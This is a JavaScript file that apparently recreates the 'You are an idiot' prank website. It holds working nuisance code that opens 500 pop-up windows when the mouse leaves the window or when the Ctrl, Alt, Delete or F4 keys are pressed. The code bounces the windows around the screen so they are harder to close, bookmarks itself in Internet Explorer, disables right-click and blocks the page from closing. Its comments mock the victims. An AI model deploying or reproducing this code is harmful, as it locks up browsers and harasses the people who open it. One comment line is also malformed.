
document.addEventListener('click', musicPlay);
//this entire part is adding the music and making it play on a loop
//When the music has played for 45 seconds, it resets the timestamp so it starts again. never-ending loop
function musicPlay() {
    var audio = document.getElementById('youare-audio');
	var micon = document.getElementById('youare-micon');
	
	micon.addEventListener('click', musicPlay);
	
	if (audio.duration > 0 && audio.paused) {
		audio.play();
		micon.src = "images/speaker.png";
	}
	else {
		audio.pause();
		audio.currentTime = 0;
		
		micon.src = "images/speakerm.png";
	}
	
	document.removeEventListener('click', musicPlay);
}

var faudio = new Audio('./miitheme.mp4')

faudio.addEventListener('timeupdate', function() {
	console.log('TimeUpdate invoked.');

    if (this.currentTime > this.duration - .45) {
        this.currentTime = 0;
        this.play();
    }
}
);

//checks if user is using internet explorer. if so, it bookmarks the website. idiot internet explorer users lol
function bookmark() {
	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
		var url = "index.html";
		var title = "Idiot!";
		
		window.external.AddFavorite(url, title);
	}
}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;
//function for changing document title(used during testing)
function changeTitle(title) {
	document.title = title;
}
///function to open pop-ups
function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}
/function that opens multiple pop-ups
function proCreate() {	
	for (var i = 0; i < 500; i++) {
		openWindow('index.html');
	}
}
//this entire block of code is just math stuff that makes the windows move around, making them even harder to close. try opening just one, and you'll see how it moves.
function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
	window.focus();
}

function fOff(){
	flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();
    
	if (flagRun == 1) {
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}

//this executes the functions and actually makes the pop-ups
window.onload = function () {
	flagRun = 1;
	
	playBall();
	bookmark(); // Internet Explorer only (what a piece of shit)
	
	return true;
}

window.onmouseout = function () {
	proCreate();

	return null;
};

window.oncontextmenu = function() {
	
	return false;
}

window.onkeydown = function() {	
	var keyCode = event.keyCode;
	
	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
		alert("You are an idiot!"); 
		proCreate();
	}
	
	return null;
}

window.onbeforeunload = function() {
    return "Are you an idiot?";
};




